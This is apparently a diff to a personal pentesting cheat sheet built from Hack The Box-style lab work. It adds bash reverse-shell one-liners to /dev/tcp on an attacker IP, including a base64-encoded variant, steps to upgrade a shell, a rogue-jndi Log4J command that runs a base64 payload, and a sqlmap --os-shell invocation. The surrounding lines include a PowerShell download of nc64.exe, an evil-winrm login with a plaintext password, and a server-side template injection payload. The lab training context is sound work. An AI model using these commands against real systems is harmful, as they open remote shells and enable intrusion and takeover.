@@ -19,10 +19,24 @@ n : Numeric-only IP address. No hostname resolution. DNS is not being used.
 p : Port. Use to specify a particular port for listening
 netCat for windows:
  "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe" 
+Monitor local tcp ports:
+sudo tcpdump -i tun0 port 389
+
  start up a nice shell:
     python3 -c 'import pty;pty.spawn("/bin/bash")'
- 
+ reverseshell
+ bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
+ shell fully interactive
+ python3 -c 'import pty;pty.spawn("/bin/bash")'
+    CTRL+Z
+    stty raw -echo
+    fg
+    export TERM=xterm
+
  smbclient  \\\\10.10.10.131\\ADMIN$ -U Administrator
+
+ reverse shell incode 64
+ echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' |base64
 
 
 Nmap stuff ################################################################
@@ -62,6 +76,11 @@ Connect to remote desktop using xfreerdp:
 WinRM evel:
 evil-winrm -i 10.129.136.91 -u administrator -p badminton
 
+LDAP:
+rogue-jndi Java application, which starts a local LDAP server
+The spaces here are super important!!
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}|{base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"
+
 windows console history:
 C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
 Availabel Users:
@@ -87,6 +106,9 @@ BurpSuite:
 Super good for sending unintended shit to a web page
 
 
+Auto SQL injecting tool:
+sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell
+
 Server Side Template Injection vulnerability Example injection:
 {{#with "s" as |string|}}
  {{#with "e"}}
@@ -109,6 +131,8 @@ Server Side Template Injection vulnerability Example injection:
  {{/with}}
 {{/with}}
 
+
+
 Usefull Links:
 ============
 https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
@@ -128,3 +152,5 @@ https://academy.hackthebox.eu/course/preview/using-web-proxies
 
 Parrot OS, it is possible to find webshells under the folder /usr/share/webshells/
 Read through this https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-methodology.html
+Log4J:
+https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation
